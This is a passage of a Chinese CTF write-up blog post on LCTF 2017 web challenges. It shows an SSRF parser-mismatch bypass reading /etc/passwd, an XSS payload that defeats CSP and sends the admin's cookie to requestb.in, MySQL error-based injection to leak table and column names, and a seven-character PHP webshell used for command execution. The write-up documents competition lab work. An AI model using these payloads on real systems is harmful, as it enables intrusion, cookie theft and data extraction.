class="line"></span><br><span class="line">是 curl(URL请求器) 和 parse\_url(URL解析器) 函数的不同导致的，猜测判断 host 是用的 parse\_url 函数</span><br><span class="line"></span><br><span class="line">提交</span><br></pre></td></tr></table></figure></p>
+<p>site=<a href="http://foo@127.0.0.1" target="_blank" rel="external">http://foo@127.0.0.1</a> @www.baidu.com:80/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">返回 </span><br><span class="line">![](http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120153838_XclIYo_3.jpeg)</span><br><span class="line">成功绕过了判断，实现了任意请求网站，这里细心点可以发现请求的是 `http://foo@127.0.0.1 @www.baidu.com:80//`，所以可以在后面加上 `?` 或 `%23` 来绕过这个</span><br><span class="line"></span><br><span class="line">用 file 协议读取本地文件:</span><br></pre></td></tr></table></figure></p>
+<p>site=file://foo@127.0.0.1 @www.baidu.com:80/etc/passwd?</p>
+<p>……<br>lctf:x:1000:1000::/home/lctf:/bin/sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">稍微猜下，读取 flag</span><br></pre></td></tr></table></figure></p>
+<p>site=file://foo@127.0.0.1 @www.baidu.com:80/home/lctf/flag?</p>
+<p></p><h1>Source Code:</h1>file://foo@127.0.0.1 @www.baidu.com:80/home/lctf/flag?/<hr>LCTF{1eTus_q14ndao_B4_387t439hg9342}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当时其实还是不懂为什么在后面加了才能读到，后来试了下</span><br></pre></td></tr></table></figure><p></p>
+<p>site=file://www.baidu.com/home/lctf/flag?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这样就可以读到，应该是 file 协议的一种特性，因为 `www.baidu.com` 是不存在的目录，所以还是在根目录下(大概</span><br><span class="line"></span><br><span class="line">### wanna hack him?</span><br><span class="line">有 preview.php 和 submit.php</span><br><span class="line">preview.php 可以看到自己的 payload 的效果</span><br><span class="line">submit.php 是发送给管理员</span><br><span class="line">可以看到有 csp</span><br><span class="line">``` html</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;nonce-909593a1d3183240d3be316e15628657&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>提交的内容显示在这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body data-feedly-mini=&quot;yes&quot;&gt;aaa&lt;p&gt;comment here&lt;/p&gt;</span><br><span class="line">&lt;script nonce=&quot;909593a1d3183240d3be316e15628657&quot;&gt;var test=&apos;test&apos;;&lt;/script&gt;</span><br><span class="line">&lt;p&gt;welcome to comment on admin&apos;s blog&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
+<p>所以如果我们提交 <code>&lt;iframe src=&#39;http://xxx.xx?</code><br>效果如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="http://xxx.xx?&amp;lt;p&amp;gt;comment here&amp;lt;/p&amp;gt;&amp;#10;&amp;lt;script nonce=&amp;quot;909593a1d3183240d3be316e15628657&amp;quot;&amp;gt;var test=" test';&lt;="" script=""&gt;</span><br><span class="line">&amp;lt;p&amp;gt;welcome to comment on admin's blog&amp;lt;/p&amp;gt;</span><br><span class="line">&amp;lt;/html&amp;gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到 nonce 值已经被包含在了 src 里，所以这里可以获取到 nonce 值，然后再提交就可以了，可以把 nonce 值输出到一个文件里，再写个脚本一旦检测到新的 nonce 值就提交，还有一种方式是利用 iframe来写入一个自动提交表单，让 bot 自己请求自己的 preview.php 页面</p>
+<p>在看到官方 wp 后，发现题目的 nonce 值是通过 session 值生成的，所以我们可以把 PHPSESSID 和 nonce 值都替换为我们的(当时想着是重写 CSP，发现并不能覆盖设置</p>
+<p><code>Meta http-equiv</code> 属性为 <code>Set-Cookie</code> 时可以设置 cookie，这样就可以覆盖之前的 cookie</p>
+<p>提交如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">content</span>=<span class="string">"PHPSESSID=naao04610f8lfg7mj4qfg6s7p4; path=/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"909593a1d3183240d3be316e15628657"</span>&gt;</span><span class="undefined">(new Image()).src='https://requestb.in/rooalgro?cookie='+escape(document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>get flag<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171121213832_PaZOec_5.jpeg" alt=""></p>
+<h3 id="“他们”有什么秘密呢"><a href="#“他们”有什么秘密呢" class="headerlink" title="“他们”有什么秘密呢?"></a>“他们”有什么秘密呢?</h3><p>过滤了 database tables users columns schema information 的数字型 sql 注入</p>
+<p>因为对其他的都没限制，所以思路就是通过显注查询得到表名、列名，最后查出数据，但是过滤了表名和列名的查询关键字</p>
+<h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p>可以通过查询不存在的表名来获得数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 union select 1 from a</span><br><span class="line"></span><br><span class="line">Table &apos;youcanneverfindme17.a&apos; doesn&apos;t exist</span><br></pre></td></tr></table></figure></p>
+<p>数据库名 <code>youcanneverfindme17</code></p>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>表名列名查了好久的资料都没找到，后来看了别人的 payload，自己真是太菜了</p>
+<p><a href="http://www.wupco.cn/?p=4117%EF%BF%BC%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B8%AA" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></p>
+<p>(waf 都是一样的…</p>
+<p>看下官方文档会发现，不只文中提到的 Polygon 函数，所有创建几何值(Create Geometry Values)的函数，其接收的参数都是 Point、LineString、Polygon 等不同于数字、字符串的数据类型，如果我们传递是非要求的数据类型就会报错(确切的说 MySQL 把它当做了列名，然后从表中取出相应列的数据)，更进一步如果是已存在的字段的话就会报出库名、表名、列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select MultiPoint(a) from users;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;a&apos; in &apos;field list&apos;</span><br><span class="line">mysql&gt; select MultiPoint(id) from users;</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`test`.`users`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure></p>
+<p>ps: 比较独特的是 Point 函数不可以，因为它接收两个数字类型的参数，所以表中的字符串型数据就被强制转换为了数字，仍然正常运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Point(user,a) from users;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;a&apos; in &apos;field list&apos;</span><br><span class="line">mysql&gt; select Point(user,pass) from users;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Point(user,pass)          |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|                         |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure></p>
+<p>和 <code>select Point(0,0) from users</code> 的结果是一样的</p>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>在可以用 union 但不知道列名的情况下是可以直接取出数据的，但是提示说也要找到列名<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ →</span></span><br></pre></td></tr></table></figure></p>
+<p>可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b) as c)</span><br><span class="line"></span><br><span class="line">Duplicate column name &apos;pro_id&apos;</span><br></pre></td></tr></table></figure></p>
+<p>原理是在使用别名的时候不能出现相同的字段名，而在这里我们用 join 把表扩成了两份</p>
+<p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test as a join test as b</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| user | pass | user | pass |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 1    | 2    | 1    | 2    |</span><br><span class="line">| test | 233  | 1    | 2    |</span><br><span class="line">| 1    | 2    | test | 233  |</span><br><span class="line">| test | 233  | test | 233  |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure></p>
+<p>所以把这个表赋予别名查询的时候报错，然后用 using 来继续得到剩下的字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c)</span><br><span class="line"></span><br><span class="line">Duplicate column name &apos;pro_name&apos;</span><br></pre></td></tr></table></figure></p>
+<p>所有字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id pro_name owner d067a0fa9dc61a6e</span><br></pre></td></tr></table></figure></p>
+<h4 id="取出数据"><a href="#取出数据" class="headerlink" title="取出数据"></a>取出数据</h4><p>拦截了 <code>d067a0fa9dc61a6e</code>，这时就要用到一种在不知道列名的情况下取出数据的方法</p>
+<p>先给出 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pro_id=0 union select 1,(select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 3,1),3,4</span><br><span class="line"></span><br><span class="line">product name:7195ca99696b5a896.php</span><br></pre></td></tr></table></figure></p>
+<p>重点是这句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf</span><br></pre></td></tr></table></figure></p>
+<p>本地试下就知道了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br><span class="line">+---+-------+-------+</span><br><span class="line">| 1 | 2     | 3     |</span><br><span class="line">+---+-------+-------+</span><br><span class="line">| 1 | 2     | 3     |</span><br><span class="line">| 1 | test  | test  |</span><br><span class="line">| 2 | test2 | test2 |</span><br><span class="line">+---+-------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>可以看到在原有表的基础上新增了一行数据，而且列名成了 1 2 3，所以接下来只要把它作为一个新表并赋予一个别名给它，<code>select e.4</code> 即查询第四列，然后用 limit 控制下第几行就可以取出所有数据了</p>
+<p>得到下一关地址 <code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p>
+<p>是一个上传文件的站点，测试下得到基本信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件名可控</span><br><span class="line">目录名根据ip变化</span><br><span class="line">只能写入七个字符</span><br><span class="line">覆盖写</span><br></pre></td></tr></table></figure></p>
+<p>根据七个字符的关键词很容易就能找到下面这个 WebShell<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`*`;</span><br></pre></td></tr></table></figure></p>
+<p>相当于在 Linux 的终端上执行 <code>*</code><br>这时就有一个骚操作了<br>新建一个空的名为 bash 的文件和一个名为 bash2 的内容为 <code>whoami</code> 的文件，执行 *</p>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171121121954_ubrcLg_3.jpeg" alt=""></p>
+<p>命令执行过程为 bash bash2，即执行 bash2 脚本里的内容<br>ps: 需要注意的是 * 按照首字母排序，所以写入 WebShell 的文件首字母要在 b 之后(bash 命令对于多个文件名参数，后面的文件会忽略掉)</p>
+<p>写入以下文件，成功命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=z.php&amp;content=&lt;?=`*`;</span><br><span class="line">filename=bash&amp;content=[任意内容]</span><br><span class="line">filename=bash2&amp;content=ls /*</span><br></pre></td></tr></table></figure></p>
+<p>发现根目录下存在 <code>/327a6c4304ad5938eaf0efb6cc3e53dc.php</code>，读取它的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename=bash2&amp;content=cat /3*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>虽然是已知知识的结合，但感觉很不错，学到了很多骚操作，另外也提醒自己要关注最新的技术 = =</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
